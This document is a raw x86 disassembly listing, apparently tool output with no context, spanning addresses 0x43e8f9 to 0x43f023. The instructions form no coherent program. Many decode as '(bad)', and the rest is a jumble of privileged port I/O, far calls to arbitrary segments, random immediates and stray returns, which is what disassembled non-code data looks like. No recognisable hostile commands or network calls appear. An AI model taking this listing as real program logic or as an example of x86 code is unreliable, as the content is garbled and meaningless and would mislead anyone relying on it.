  43e8f9:	idiv   BYTE PTR fs:[eax+0x70]
  43e8fd:	dec    DWORD PTR [edi+0x61a18752]
  43e903:	call   FWORD PTR [ebx*8+0x7a1a6840]
  43e90a:	xorps  xmm2,xmm6
  43e90d:	jb     0x43e987
  43e90f:	mov    esi,0x91a9d38b
  43e914:	mov    WORD PTR [esi],?
  43e916:	pop    edi
  43e917:	les    eax,FWORD PTR [ebx-0x49629bb3]
  43e91d:	cwde   
  43e91e:	cdq    
  43e91f:	(bad)  
  43e920:	fwait
  43e921:	add    DWORD PTR [esi-0x7f58a9ec],0x20d726ab
  43e92b:	mov    ds:0x3554d56e,eax
  43e930:	(bad)  
  43e931:	push   edi
  43e932:	(bad)  
  43e933:	cmp    cl,BYTE PTR [edx-0x17181f87]
  43e939:	lods   eax,DWORD PTR ds:[esi]
  43e93a:	mov    cl,BYTE PTR [ecx]
  43e93c:	pop    ecx
  43e93d:	cmp    edx,esp
  43e93f:	(bad)  
  43e940:	jge    0x43e944
  43e942:	outs   dx,BYTE PTR ds:[esi]
  43e943:	scas   al,BYTE PTR es:[edi]
  43e944:	sbb    esi,DWORD PTR [edx]
  43e946:	sub    BYTE PTR [esp+ebx*1],cl
  43e949:	sbb    DWORD PTR [ecx],0x1f
  43e94c:	dec    edi
  43e94d:	out    dx,al
  43e94e:	pop    ds
  43e94f:	add    ecx,DWORD PTR [eax+0x64db7920]
  43e955:	mov    edi,DWORD PTR [ebx-0x6eea9355]
  43e95b:	loop   0x43e985
  43e95d:	ret    0x4db5
  43e960:	cmp    dl,dh
  43e962:	pusha  
  43e963:	cmp    eax,0x6acb570a
  43e968:	fs stos BYTE PTR es:[edi],al
  43e96a:	rcl    ebp,1
  43e96c:	pushf  
  43e96d:	stc    
  43e96e:	call   0xfd05:0x8f5f6b30
  43e975:	jge    0x43e916
  43e977:	aam    0x3b
  43e979:	ja     0x43e968
  43e97b:	dec    ebp
  43e97c:	es scas al,BYTE PTR es:[edi]
  43e97e:	adc    eax,0xeb11228a
  43e983:	aad    0xaf
  43e985:	pop    edi
  43e986:	dec    edx
  43e987:	pop    eax
  43e988:	ins    BYTE PTR es:[edi],dx
  43e989:	inc    edi
  43e98a:	pop    ds
  43e98b:	xchg   ebp,eax
  43e98c:	dec    ebp
  43e98d:	ds popf 
  43e98f:	sub    eax,0xd5d3c29e
  43e994:	(bad)  
  43e995:	enter  0x3cfb,0xa2
  43e999:	xchg   ebp,eax
  43e99a:	sbb    bh,al
  43e99c:	mov    ecx,edi
  43e99e:	loope  0x43ea06
  43e9a0:	dec    eax
  43e9a1:	xlat   BYTE PTR ds:[ebx]
  43e9a2:	icebp  
  43e9a3:	ret    
  43e9a4:	dec    edi
  43e9a5:	inc    edi
  43e9a6:	es or  ebx,ecx
  43e9a9:	daa    
  43e9aa:	imul   esi,DWORD PTR [ecx+0x8],0xffffffea
  43e9ae:	bound  edi,QWORD PTR [ecx+0x15]
  43e9b1:	jp     0x43ea0a
  43e9b3:	pop    ss
  43e9b4:	add    al,ah
  43e9b6:	pusha  
  43e9b7:	mov    bh,dl
  43e9b9:	mov    eax,ds:0x2f20acd
  43e9be:	sar    BYTE PTR ds:0xd76d0aad,cl
  43e9c4:	shl    BYTE PTR [edi+0x1e],cl
  43e9c7:	aas    
  43e9c8:	sbb    eax,0x2144cce
  43e9cd:	fldlg2 
  43e9cf:	aam    0x8c
  43e9d1:	and    eax,0x59
  43e9d4:	neg    DWORD PTR [ebx+eax*4]
  43e9d7:	mov    edi,0xd4ac9c30
  43e9dc:	add    BYTE PTR [edx-0x77],ch
  43e9df:	dec    esp
  43e9e0:	cwde   
  43e9e1:	aad    0xb
  43e9e3:	xlat   BYTE PTR ds:[ebx]
  43e9e4:	mov    esp,0x810d704b
  43e9e9:	or     eax,0x91940725
  43e9ee:	push   ecx
  43e9ef:	mov    ch,0x6d
  43e9f1:	mov    ebp,esp
  43e9f3:	sar    BYTE PTR [ebx-0x53],cl
  43e9f6:	and    al,BYTE PTR [edx+esi*1-0x502babc8]
  43e9fd:	stos   BYTE PTR es:[edi],al
  43e9fe:	jnp    0x43ea60
  43ea00:	xchg   ecx,eax
  43ea01:	sub    BYTE PTR [ebp+eiz*1-0x77],dl
  43ea05:	xor    edx,DWORD PTR [edx-0x22562a0f]
  43ea0b:	jne    0x43ea20
  43ea0d:	add    dl,dh
  43ea0f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43ea10:	fcomp  DWORD PTR [esi-0xcc9b689]
  43ea16:	pusha  
  43ea17:	(bad)  
  43ea19:	outs   dx,DWORD PTR ds:[esi]
  43ea1a:	ret    
  43ea1b:	add    DWORD PTR [edx],esi
  43ea1d:	dec    eax
  43ea1e:	add    al,0xd7
  43ea20:	inc    ebp
  43ea21:	ret    0xaa58
  43ea24:	adc    bl,BYTE PTR [ecx+0x55963ad1]
  43ea2a:	push   ebx
  43ea2b:	add    dl,BYTE PTR [edi-0x3c689a3d]
  43ea31:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43ea32:	neg    DWORD PTR [eax-0x29dbfd19]
  43ea38:	test   DWORD PTR ss:[esi-0x5a],0xedefaed9
  43ea40:	daa    
  43ea41:	sbb    BYTE PTR [edi+edx*1-0x40],bh
  43ea45:	mov    eax,ds:0x3570e91f
  43ea4a:	mov    DWORD PTR cs:[edi],ebp
  43ea4d:	add    al,BYTE PTR [edx]
  43ea4f:	mov    eax,ds:0x4ebccf07
  43ea54:	fsub   st,st(1)
  43ea56:	pop    ss
  43ea57:	ja     0x43e9e2
  43ea59:	push   ebx
  43ea5a:	and    al,0x90
  43ea5c:	lods   al,BYTE PTR ds:[esi]
  43ea5d:	(bad)  
  43ea5e:	sbb    esp,DWORD PTR [ecx+0x4a2605ab]
  43ea64:	fild   QWORD PTR [ebx+0x6f5ed26c]
  43ea6a:	push   ds
  43ea6b:	and    eax,0x22b9624e
  43ea70:	repnz add BYTE PTR [edi+0x2021045],bh
  43ea77:	and    edx,DWORD PTR ds:0x7cb8c0b5
  43ea7d:	out    0x94,eax
  43ea7f:	pop    ds
  43ea80:	push   ecx
  43ea81:	inc    esi
  43ea82:	fsub   QWORD PTR [eax]
  43ea84:	mov    ebx,eax
  43ea86:	push   ecx
  43ea87:	cmp    eax,0xc1c81f38
  43ea8c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43ea8d:	pop    ss
  43ea8e:	adc    al,0xee
  43ea90:	adc    DWORD PTR [ebp+0x69],eax
  43ea93:	push   ss
  43ea94:	and    eax,0x48d8eb4f
  43ea99:	or     DWORD PTR [esi-0x1d406429],edx
  43ea9f:	mov    ah,0xd8
  43eaa1:	xchg   DWORD PTR [ecx-0x6f23b0c8],ecx
  43eaa7:	xchg   ah,dh
  43eaa9:	jbe    0x43eaca
  43eaab:	adc    DWORD PTR [eax],edx
  43eaad:	pop    esi
  43eaae:	imul   ebx,DWORD PTR [ebp+0x5d456051],0x31
  43eab5:	push   esp
  43eab6:	pop    ebp
  43eab7:	mov    cl,0xbe
  43eab9:	lods   al,BYTE PTR ds:[esi]
  43eaba:	pushf  
  43eabb:	mov    edi,0x790ca789
  43eac0:	inc    esi
  43eac1:	and    DWORD PTR [edi],ebx
  43eac3:	xchg   edi,eax
  43eac4:	sbb    dl,BYTE PTR [esi+0x1a]
  43eac7:	(bad)  
  43eac8:	and    eax,0xfaf28afa
  43eacd:	add    edx,DWORD PTR [edx]
  43eacf:	mov    ebx,0x3ff7501e
  43ead4:	dec    edi
  43ead5:	(bad)  
  43ead7:	(bad)  
  43ead9:	inc    ebp
  43eada:	dec    esi
  43eadb:	add    al,0x8c
  43eadd:	iret   
  43eade:	sub    ebp,0x8da1c26b
  43eae4:	cmovp  ebx,DWORD PTR [edx+eiz*8]
  43eae8:	js     0x43ea70
  43eaea:	pusha  
  43eaeb:	fnstsw WORD PTR [edi-0x4b]
  43eaee:	jge    0x43eab1
  43eaf0:	fldenv [esi]
  43eaf2:	sub    dh,BYTE PTR [ebx]
  43eaf4:	mov    bl,dh
  43eaf6:	jecxz  0x43eb09
  43eaf8:	jle    0x43ead0
  43eafa:	imul   ebp,DWORD PTR [esi],0xd43cff36
  43eb00:	add    al,0x35
  43eb02:	shl    DWORD PTR [ecx],cl
  43eb04:	jge    0x43eaec
  43eb06:	mov    dl,0x52
  43eb08:	jo     0x43ea96
  43eb0a:	cmp    al,0x41
  43eb0c:	mov    ch,dl
  43eb0e:	out    0xae,eax
  43eb10:	and    esi,DWORD PTR [eax+0x22]
  43eb13:	push   es
  43eb14:	pop    DWORD PTR ds:0xb7614abe
  43eb1a:	ins    DWORD PTR es:[edi],dx
  43eb1b:	hlt    
  43eb1c:	sub    edi,0xabf4277b
  43eb22:	stc    
  43eb23:	mov    eax,0xc1610372
  43eb28:	jp     0x43eb82
  43eb2a:	push   es
  43eb2b:	sar    BYTE PTR [eax],cl
  43eb2d:	dec    edi
  43eb2e:	jp     0x43eb11
  43eb30:	xor    BYTE PTR [esi+0x2e],bl
  43eb33:	inc    ebp
  43eb34:	jae    0x43eabc
  43eb36:	pop    bx
  43eb38:	or     BYTE PTR [esi],al
  43eb3a:	mov    ecx,0xdce2ec1d
  43eb3f:	cmp    BYTE PTR [eax+0x2],dl
  43eb42:	sbb    cl,ch
  43eb44:	sbb    DWORD PTR [eax],edx
  43eb46:	jno    0x43eb61
  43eb48:	jno    0x43eae8
  43eb4a:	pusha  
  43eb4b:	lods   eax,DWORD PTR ds:[esi]
  43eb4c:	aam    0x44
  43eb4e:	je     0x43ebca
  43eb50:	push   eax
  43eb51:	mov    edi,0x4c0ad59b
  43eb56:	repnz sub DWORD PTR [esi-0x795a5539],esp
  43eb5d:	mov    ebx,0x29765d4b
  43eb62:	jg     0x43ebca
  43eb64:	repz pusha 
  43eb66:	iret   
  43eb67:	mov    ah,0xa9
  43eb69:	dec    ebx
  43eb6a:	or     BYTE PTR [ebp-0x777041ce],ch
  43eb70:	push   edx
  43eb71:	or     eax,0xc2bb157e
  43eb76:	mov    ebp,0xb836ecb4
  43eb7b:	aam    0xd8
  43eb7d:	into   
  43eb7e:	sub    ecx,DWORD PTR [ecx]
  43eb80:	ins    DWORD PTR es:[edi],dx
  43eb81:	push   esi
  43eb82:	repz adc al,0x95
  43eb85:	repz inc esi
  43eb87:	xlat   BYTE PTR ds:[ebx]
  43eb88:	pop    esi
  43eb89:	frstor [ecx-0x4f4a240a]
  43eb8f:	push   edi
  43eb90:	push   ss
  43eb91:	add    bl,BYTE PTR [edi+ebx*8+0x2207913]
  43eb98:	xchg   esp,eax
  43eb99:	add    bl,BYTE PTR [ecx-0x61]
  43eb9c:	mov    ebp,0xd4009f08
  43eba1:	test   BYTE PTR [ecx-0x24086eee],0x6e
  43eba8:	in     eax,0xac
  43ebaa:	rcr    BYTE PTR [edi],1
  43ebac:	mov    BYTE PTR [edi-0x38],bh
  43ebaf:	(bad)  
  43ebb1:	add    ebp,edi
  43ebb3:	sub    edx,DWORD PTR [esi+esi*8+0x37]
  43ebb7:	aam    0x78
  43ebb9:	push   ebx
  43ebba:	sbb    BYTE PTR [ebx-0x14],dh
  43ebbd:	stc    
  43ebbe:	mov    al,ds:0x3f718929
  43ebc3:	test   BYTE PTR [ebx+0x41],ah
  43ebc6:	sahf   
  43ebc7:	mov    dl,0x38
  43ebc9:	add    cl,BYTE PTR [eax+edi*4+0x61]
  43ebcd:	adc    eax,0x182d4f1a
  43ebd2:	or     eax,DWORD PTR [ecx-0x78]
  43ebd5:	lds    eax,FWORD PTR [edi+0x65]
  43ebd8:	sbb    ecx,DWORD PTR [edx+0x36f0614]
  43ebde:	mov    al,ds:0x273ba841
  43ebe3:	push   ebp
  43ebe4:	jae    0x43eb91
  43ebe6:	pusha  
  43ebe7:	popf   
  43ebe8:	jno    0x43eb7c
  43ebea:	pop    edx
  43ebeb:	cs mov esp,0xe8d42c2f
  43ebf1:	out    0xe,eax
  43ebf3:	es je  0x43ec70
  43ebf6:	in     eax,0xc4
  43ebf8:	mov    ecx,esp
  43ebfa:	mov    ch,0xd5
  43ebfc:	add    al,0x3f
  43ebfe:	jb     0x43eb97
  43ec00:	mov    WORD PTR [eax],es
  43ec02:	or     BYTE PTR [ecx],0xb1
  43ec05:	pop    edx
  43ec06:	out    0x50,al
  43ec08:	repnz stos BYTE PTR es:[edi],al
  43ec0a:	fs stc 
  43ec0c:	mov    ecx,esp
  43ec0e:	shl    DWORD PTR ds:0x41b94e56,1
  43ec14:	xlat   BYTE PTR ds:[ebx]
  43ec15:	add    ch,BYTE PTR [edi+ebx*4+0x4099c967]
  43ec1c:	pop    esi
  43ec1d:	je     0x43ec8f
  43ec1f:	test   eax,0xd4c1151e
  43ec24:	dec    ebx
  43ec25:	test   al,0xc1
  43ec27:	aad    0x9a
  43ec29:	add    bh,BYTE PTR [esi-0x1d]
  43ec2c:	sub    BYTE PTR [ecx-0x54],ch
  43ec2f:	jne    0x43ec61
  43ec31:	push   esi
  43ec32:	fild   WORD PTR [ecx-0x47]
  43ec35:	lock fsubr QWORD PTR [edi]
  43ec38:	jne    0x43ec3c
  43ec3a:	and    al,0x84
  43ec3c:	cmp    DWORD PTR [ebp-0x251fca0c],0x5d4cdd7
  43ec46:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43ec47:	push   ebx
  43ec48:	addr16 mov ah,0x77
  43ec4b:	jge    0x43ec91
  43ec4d:	xchg   DWORD PTR [ebx],esi
  43ec4f:	sub    al,0x89
  43ec51:	popa   
  43ec52:	cld    
  43ec53:	inc    esp
  43ec54:	imul   esi,DWORD PTR [eax-0x7c],0xed0b884f
  43ec5b:	push   edx
  43ec5c:	ins    BYTE PTR es:[edi],dx
  43ec5d:	pop    ebx
  43ec5e:	cmp    DWORD PTR [eax+edx*1+0x6baab9f4],ebp
  43ec65:	adc    ebp,edx
  43ec67:	aam    0x9d
  43ec69:	loop   0x43ecc1
  43ec6b:	jge    0x43ec52
  43ec6d:	xor    al,0x1e
  43ec6f:	cmovae eax,ecx
  43ec72:	lds    ebp,FWORD PTR [edx]
  43ec74:	push   ss
  43ec75:	out    dx,al
  43ec76:	jnp    0x43ec4b
  43ec78:	inc    esi
  43ec79:	and    ecx,DWORD PTR [edi+0x24]
  43ec7c:	retf   
  43ec7d:	dec    eax
  43ec7e:	outs   dx,DWORD PTR ds:[esi]
  43ec7f:	ins    BYTE PTR es:[edi],dx
  43ec80:	sbb    al,0x8b
  43ec82:	or     BYTE PTR [ebp-0x75],bl
  43ec85:	addr16 push es
  43ec87:	pop    esp
  43ec88:	jae    0x43ec3a
  43ec8a:	cmc    
  43ec8b:	call   0xd460d5d8
  43ec90:	lods   al,BYTE PTR ss:[esi]
  43ec92:	jge    0x43ecb9
  43ec94:	and    DWORD PTR [edi+0x18],eax
  43ec97:	out    dx,eax
  43ec98:	jo     0x43ecc6
  43ec9a:	pop    ds
  43ec9b:	(bad)  
  43ec9c:	jmp    0xc15d3afd
  43eca1:	ss sub al,0x44
  43eca4:	cmp    BYTE PTR [ebx+ecx*1],bh
  43eca7:	call   0xe63d:0x5596e0fc
  43ecae:	sub    al,0x72
  43ecb0:	jmp    DWORD PTR [bx+si+0x55]
  43ecb4:	pop    es
  43ecb5:	lahf   
  43ecb6:	mov    esp,0x786830bb
  43ecbb:	aad    0xec
  43ecbd:	shl    BYTE PTR [edx],1
  43ecbf:	xor    eax,0x5cd978a5
  43ecc4:	mov    al,0x83
  43ecc6:	sub    BYTE PTR [edi+eax*4-0x364f970e],dh
  43eccd:	push   ss
  43ecce:	adc    edx,DWORD PTR [edx-0x77]
  43ecd1:	add    dh,BYTE PTR [esi]
  43ecd3:	mov    cl,0x41
  43ecd5:	push   ebx
  43ecd6:	imul   esi,edi,0xffffffab
  43ecd9:	mov    cl,0x61
  43ecdb:	mov    ebp,DWORD PTR [edi-0x46d35545]
  43ece1:	inc    ebx
  43ece2:	xchg   ebp,eax
  43ece3:	aad    0x29
  43ece5:	fimul  DWORD PTR [ecx-0x7a]
  43ece8:	js     0x43ecbb
  43ecea:	or     ebp,DWORD PTR [eax]
  43ecec:	fwait
  43eced:	jnp    0x43ec8d
  43ecef:	dec    ebp
  43ecf0:	pushf  
  43ecf1:	daa    
  43ecf2:	push   0x4da9d255
  43ecf7:	xor    bl,dl
  43ecf9:	add    eax,0xc89e7a7a
  43ecfe:	xor    esp,DWORD PTR [ecx+0x77]
  43ed01:	jl     0x43ecf1
  43ed03:	sub    edi,edi
  43ed05:	adc    esi,DWORD PTR [esi-0x20e70598]
  43ed0b:	das    
  43ed0c:	or     BYTE PTR [ebx-0x77],dl
  43ed0f:	clc    
  43ed10:	mov    al,0x5
  43ed12:	data16 scas al,BYTE PTR es:[edi]
  43ed14:	push   0xffffffd4
  43ed16:	sub    ah,al
  43ed18:	jo     0x43ed54
  43ed1a:	pop    ds
  43ed1b:	dec    ebx
  43ed1c:	retf   
  43ed1d:	jns    0x43ecf3
  43ed1f:	xchg   edx,eax
  43ed20:	inc    eax
  43ed21:	and    eax,0x7362d405
  43ed26:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43ed27:	xchg   esp,eax
  43ed28:	xchg   ecx,eax
  43ed29:	push   es
  43ed2a:	xor    BYTE PTR [ebp+esi*2+0x48],ah
  43ed2e:	pop    edx
  43ed2f:	inc    ebp
  43ed30:	(bad)  
  43ed31:	xor    al,0x1d
  43ed33:	ror    ah,cl
  43ed35:	mov    esi,0x80aeef96
  43ed3a:	jbe    0x43ed8c
  43ed3c:	jno    0x43ed83
  43ed3e:	es int 0x8c
  43ed41:	inc    esp
  43ed42:	add    dh,BYTE PTR [eax-0x3193fd4f]
  43ed48:	ret    
  43ed49:	adc    BYTE PTR [esi],0xaf
  43ed4c:	mov    BYTE PTR [ecx+0x5d],bh
  43ed4f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43ed50:	xchg   ecx,eax
  43ed51:	jo     0x43ed13
  43ed53:	call   0xf753efcc
  43ed58:	push   esp
  43ed59:	popf   
  43ed5a:	mov    bh,dl
  43ed5c:	cs push eax
  43ed5e:	lahf   
  43ed5f:	shr    BYTE PTR [ecx],1
  43ed61:	jnp    0x43ed4e
  43ed63:	fucomip st,st(1)
  43ed65:	sbb    al,0xd0
  43ed67:	iret   
  43ed68:	sbb    al,0xc9
  43ed6a:	lds    ebp,FWORD PTR [esi]
  43ed6c:	clc    
  43ed6d:	pop    edx
  43ed6e:	and    DWORD PTR [ebp-0x72cf7e76],0x1efd6fd
  43ed78:	dec    eax
  43ed79:	test   DWORD PTR [esi],eax
  43ed7b:	fdiv   DWORD PTR [eax+0x2b]
  43ed7e:	fidivr DWORD PTR [esi+edx*4]
  43ed81:	inc    esp
  43ed82:	inc    edx
  43ed83:	push   0xffffff8d
  43ed85:	imul   edi,esi,0x14
  43ed88:	loop   0x43ed12
  43ed8a:	xchg   ecx,eax
  43ed8b:	push   ebx
  43ed8c:	adc    ch,BYTE PTR [ebp+0x4fdc2540]
  43ed92:	pop    ebx
  43ed93:	popf   
  43ed94:	xchg   esp,eax
  43ed95:	mov    dl,0xa
  43ed97:	push   esp
  43ed98:	sub    al,0xff
  43ed9a:	adc    bl,cl
  43ed9c:	cdq    
  43ed9d:	cs push ds
  43ed9f:	rol    DWORD PTR [ebp-0x24],1
  43eda2:	dec    esi
  43eda3:	in     al,0x78
  43eda5:	shr    DWORD PTR [ebx+0x6b4f70d5],1
  43edab:	rcl    DWORD PTR [edx+edx*1-0x5c70959a],0x0
  43edb3:	nop
  43edb4:	arpl   WORD PTR [edx],bp
  43edb6:	or     dh,BYTE PTR [edi-0x2b59b596]
  43edbc:	in     al,dx
  43edbd:	ins    BYTE PTR es:[edi],dx
  43edbe:	cmp    DWORD PTR [esi],0x1c1edd4a
  43edc4:	rcr    BYTE PTR gs:[edi],0x87
  43edc8:	(bad)  
  43edc9:	in     eax,dx
  43edca:	mov    DWORD PTR [edx],edi
  43edcc:	hlt    
  43edcd:	aam    0xcd
  43edcf:	aad    0xd3
  43edd1:	mov    ds:0x471caec,al
  43edd6:	inc    ecx
  43edd7:	push   edi
  43edd8:	sahf   
  43edd9:	mov    bh,0x5a
  43eddb:	ret    0x252
  43edde:	sub    BYTE PTR [edi],al
  43ede0:	call   0x9dd3:0x47aa541c
  43ede7:	enter  0xa2fb,0xa5
  43edeb:	addr16 aad 0x47
  43edee:	pop    ds
  43edef:	and    ebx,esp
  43edf1:	inc    ecx
  43edf2:	scas   al,BYTE PTR es:[edi]
  43edf3:	xchg   DWORD PTR [esp+esi*8+0x1a],ebp
  43edf7:	xchg   ebp,eax
  43edf8:	add    ch,ah
  43edfa:	or     edx,esp
  43edfc:	inc    ecx
  43edfd:	inc    edi
  43edfe:	retf   
  43edff:	repnz ss addr16 dec ebx
  43ee03:	mov    ch,0x16
  43ee05:	frstor [eax-0x27]
  43ee08:	je     0x43ee52
  43ee0a:	jecxz  0x43ee02
  43ee0c:	rol    DWORD PTR ds:0x6deba318,cl
  43ee12:	adc    esi,ecx
  43ee14:	int    0x1c
  43ee16:	aas    
  43ee17:	dec    DWORD PTR [ecx+0xeb6235b]
  43ee1d:	outs   dx,DWORD PTR ds:[esi]
  43ee1e:	mov    ah,0xae
  43ee20:	add    al,0x1
  43ee22:	and    BYTE PTR [ebx-0x18],al
  43ee25:	dec    edx
  43ee26:	dec    ecx
  43ee27:	jmp    0x13b1f97d
  43ee2c:	pop    ebp
  43ee2d:	or     DWORD PTR [ecx+0x3b],esi
  43ee30:	jmp    0x43eea8
  43ee32:	xchg   ch,dl
  43ee34:	sbb    al,0xd0
  43ee36:	(bad)  
  43ee37:	mov    eax,0xc5743a50
  43ee3c:	test   eax,0x20a15b5d
  43ee41:	es dec ebp
  43ee43:	repnz or al,cl
  43ee46:	add    al,0x5b
  43ee48:	je     0x43eec9
  43ee4a:	pusha  
  43ee4b:	ja     0x43ee06
  43ee4d:	inc    ecx
  43ee4e:	es xchg edi,eax
  43ee50:	inc    edx
  43ee51:	xlat   BYTE PTR ds:[ebx]
  43ee52:	bsr    eax,DWORD PTR [ebx-0x203373fb]
  43ee59:	pop    ebp
  43ee5a:	inc    ebp
  43ee5b:	pop    ebx
  43ee5c:	lods   eax,DWORD PTR ds:[esi]
  43ee5d:	std    
  43ee5e:	pusha  
  43ee5f:	and    eax,0x9b37f2bb
  43ee64:	push   esp
  43ee65:	mov    edx,0xdeb3994d
  43ee6a:	(bad)  
  43ee6b:	aad    0xc2
  43ee6d:	inc    ebp
  43ee6e:	in     al,0x9a
  43ee70:	cmp    BYTE PTR [edx],dl
  43ee72:	pop    ds
  43ee73:	cmp    ebp,esp
  43ee75:	mov    BYTE PTR [eax-0x59],dl
  43ee78:	mov    esi,0xafd4e371
  43ee7d:	repnz cld 
  43ee7f:	popa   
  43ee80:	ins    DWORD PTR es:[edi],dx
  43ee81:	call   0x6380:0x77886546
  43ee88:	mov    bl,0xbc
  43ee8a:	je     0x43ee66
  43ee8c:	push   esp
  43ee8d:	sbb    eax,0x5eaaa042
  43ee92:	outs   dx,BYTE PTR ds:[esi]
  43ee93:	fdivr  st,st(1)
  43ee95:	adc    al,0x95
  43ee97:	inc    edx
  43ee98:	xchg   esp,eax
  43ee99:	stos   DWORD PTR es:[edi],eax
  43ee9a:	push   ebx
  43ee9b:	mov    dl,0xd3
  43ee9d:	add    al,bl
  43ee9f:	aad    0xb6
  43eea1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43eea2:	fistp  DWORD PTR [ecx-0x2bcb1332]
  43eea8:	loop   0x43ee36
  43eeaa:	xchg   edi,eax
  43eeab:	jge    0x43ef1b
  43eead:	xor    DWORD PTR [edi],ebx
  43eeaf:	sbb    ecx,DWORD PTR [ebx-0x39]
  43eeb2:	dec    edx
  43eeb3:	add    al,0xa
  43eeb5:	push   esi
  43eeb6:	pushf  
  43eeb7:	aam    0x1f
  43eeb9:	leave  
  43eeba:	push   ds
  43eebb:	stos   DWORD PTR es:[edi],eax
  43eebc:	xchg   edx,eax
  43eebd:	lds    edx,FWORD PTR [ecx+edi*1-0x61981662]
  43eec4:	mov    BYTE PTR ds:0xd368ff94,0x8a
  43eecb:	aam    0xb8
  43eecd:	fnstenv [esi-0x1b068f50]
  43eed3:	pop    ds
  43eed4:	xchg   esp,eax
  43eed5:	xchg   ecx,eax
  43eed6:	dec    eax
  43eed7:	mov    al,ds:0x30d5d6f
  43eedc:	jbe    0x43eef1
  43eede:	popa   
  43eedf:	fimul  WORD PTR ds:[ebx-0x54]
  43eee3:	cwde   
  43eee4:	sub    DWORD PTR [edx],eax
  43eee6:	loopne 0x43eef1
  43eee8:	sbb    eax,0x88dd38d3
  43eeed:	shr    DWORD PTR [ecx-0x27],1
  43eef0:	push   edi
  43eef1:	and    DWORD PTR [edx+0x54f6749c],ecx
  43eef7:	aam    0x6
  43eef9:	sub    esi,DWORD PTR [edx+0xf5a6a8a]
  43eeff:	push   ds
  43ef00:	mov    DWORD PTR [edi],edi
  43ef02:	outs   dx,BYTE PTR ds:[esi]
  43ef03:	cs loopne 0x43eef3
  43ef06:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  43ef08:	and    eax,0x78dbba4b
  43ef0d:	xor    DWORD PTR [ebp+0x52],0xffffffbc
  43ef11:	xor    BYTE PTR [edx],bh
  43ef13:	int    0x89
  43ef15:	dec    edi
  43ef16:	add    esi,DWORD PTR [ebx+0x3]
  43ef19:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43ef1a:	in     al,dx
  43ef1b:	ss or  al,0x2
  43ef1e:	pop    edx
  43ef1f:	xor    eax,0xfdc7fa68
  43ef24:	ins    DWORD PTR es:[edi],dx
  43ef25:	shl    BYTE PTR [eax+0x15],cl
  43ef28:	(bad)  
  43ef29:	push   edx
  43ef2a:	test   DWORD PTR [eax-0x20831a17],0x2a6002e8
  43ef34:	(bad)  [eax+eiz*1+0x6d]
  43ef38:	cdq    
  43ef39:	and    bl,BYTE PTR [esi]
  43ef3b:	imul   edi,DWORD PTR [eax],0xeb9ef1a0
  43ef41:	gs enter 0x637a,0xf6
  43ef46:	pushw  es
  43ef48:	out    0xf9,al
  43ef4a:	test   DWORD PTR [edx],ebp
  43ef4c:	inc    edi
  43ef4d:	ret    
  43ef4e:	and    al,0xdf
  43ef50:	xor    BYTE PTR [ebp-0x554f09a1],bl
  43ef56:	pop    ds
  43ef57:	(bad)
  43ef5a:	mov    ebx,0x3dd23a02
  43ef5f:	aam    0x18
  43ef61:	sub    DWORD PTR [esp+ebx*1],0xffffffb8
  43ef65:	daa    
  43ef66:	jecxz  0x43efa1
  43ef68:	mov    edx,DWORD PTR [edi-0x13f91018]
  43ef6e:	scas   eax,DWORD PTR es:[edi]
  43ef6f:	push   ss
  43ef70:	enter  0xdc01,0xaa
  43ef74:	push   ecx
  43ef75:	and    BYTE PTR [esi],ch
  43ef77:	mov    ds:0x88a2c26c,al
  43ef7c:	sbb    ebx,DWORD PTR [edi]
  43ef7e:	pop    ds
  43ef7f:	push   ebx
  43ef81:	lock aad 0x8
  43ef84:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43ef85:	jbe    0x43efd8
  43ef87:	xlat   BYTE PTR ds:[ebx]
  43ef88:	test   BYTE PTR [edx],dh
  43ef8a:	scas   eax,DWORD PTR es:[edi]
  43ef8b:	rol    BYTE PTR [eax+0x72],cl
  43ef8e:	push   ebx
  43ef8f:	push   edi
  43ef90:	inc    edi
  43ef91:	ret    
  43ef92:	cdq    
  43ef93:	popa   
  43ef94:	mov    BYTE PTR ds:0x234bf895,bl
  43ef9a:	loope  0x43ef28
  43ef9c:	mov    WORD PTR [edx],es
  43ef9e:	push   eax
  43ef9f:	push   ebp
  43efa0:	iret   
  43efa1:	dec    esi
  43efa2:	push   0x6476c7e1
  43efa7:	retf   
  43efa8:	dec    ebp
  43efa9:	hlt    
  43efaa:	adc    ah,0x85
  43efad:	inc    edx
  43efae:	mov    ebx,0x4023927
  43efb3:	loope  0x43efc4
  43efb5:	lahf   
  43efb6:	and    al,0x33
  43efb8:	je     0x43f037
  43efba:	push   ds
  43efbb:	icebp  
  43efbc:	call   FWORD PTR [edx]
  43efbe:	into   
  43efbf:	push   ds
  43efc0:	sahf   
  43efc1:	adc    eax,0x2d95baa0
  43efc6:	push   eax
  43efc7:	sbb    eax,0x1aa08115
  43efcc:	xchg   edi,eax
  43efcd:	mov    eax,ds:0x31b5ec15
  43efd2:	aam    0xbe
  43efd4:	or     eax,0xe34f9d21
  43efd9:	sub    BYTE PTR [esi-0x59fffbca],0x6d
  43efe0:	cmp    al,0x8f
  43efe2:	push   es
  43efe3:	lahf   
  43efe4:	adc    ebp,DWORD PTR [edx+0x4988d7d0]
  43efea:	mov    ah,0x91
  43efec:	dec    esi
  43efed:	push   edx
  43efee:	inc    esi
  43efef:	loopne 0x43f01d
  43eff1:	push   esi
  43eff2:	dec    esi
  43eff3:	hlt    
  43eff4:	jb     0x43eff9
  43eff6:	cmp    cl,BYTE PTR [esi-0x74fb029e]
  43effc:	mov    BYTE PTR [edi],ah
  43effe:	xor    edi,edx
  43f000:	ja     0x43ef8e
  43f002:	pop    ecx
  43f003:	mov    eax,ds:0x108202e2
  43f008:	out    0x67,al
  43f00a:	iret   
  43f00b:	pop    esi
  43f00c:	sbb    al,BYTE PTR [ebp-0x12d6f6a0]
  43f012:	fs push esp
  43f014:	cld    
  43f015:	xchg   ecx,eax
  43f016:	mov    bl,0xd4
  43f018:	inc    ecx
  43f019:	pop    ecx
  43f01a:	sti    
  43f01b:	or     DWORD PTR [ecx+edi*8-0x6a0a2d5f],ebp
  43f022:	push   edi
  43f023:	aad    0xa5
